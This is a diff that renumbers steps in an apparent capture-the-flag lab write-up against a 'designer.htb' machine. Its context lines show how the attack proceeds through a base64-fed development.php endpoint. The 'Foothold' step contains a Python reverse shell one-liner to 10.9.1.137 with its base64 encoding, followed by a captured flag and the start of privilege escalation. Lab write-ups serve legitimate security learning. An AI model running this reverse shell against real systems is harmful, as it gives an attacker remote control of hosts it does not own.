@@ -227,9 +227,9 @@ running a bash reverse shell to obtain a shell as the user "nobody" in a docker 
 
 8. add domain name underdevelopment.designer.htb into /etc/hosts
 <img src="img/subindex.png">
-10. discover manually html coded buttons in underdevelopment.designer.htb/services.html
+9. discover manually html coded buttons in underdevelopment.designer.htb/services.html
 <img src="img/subservices.png">
-11. pressing the buttons redirects to:
+10. pressing the buttons redirects to:
 
 http://underdevelopment.designer.htb/development.php?display={some base64 hash}
 
@@ -253,7 +253,7 @@ http://underdevelopment.designer.htb/development.php?display={some base64 hash}
         echo "<pre>$output</pre>";
         ?>
 
-12. Foothold
+11. Foothold
 
         $ echo "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.9.1.137',666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"" | base64 -w 0
         cHl0aG9uMyAtYyAiaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjkuMS4xMzcnLDY2NikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWycvYmluL2Jhc2gnLCctaSddKTsiCg==
@@ -272,7 +272,7 @@ http://underdevelopment.designer.htb/development.php?display={some base64 hash}
         cat ~/user.txt
         c32ba831818880876035e98d868b9b70
         
-13. Privilege Escalation
+12. Privilege Escalation
 
         cybercraze@designer:/var/www/subdomains/underdevelopment$ sudo --version
         sudo --version
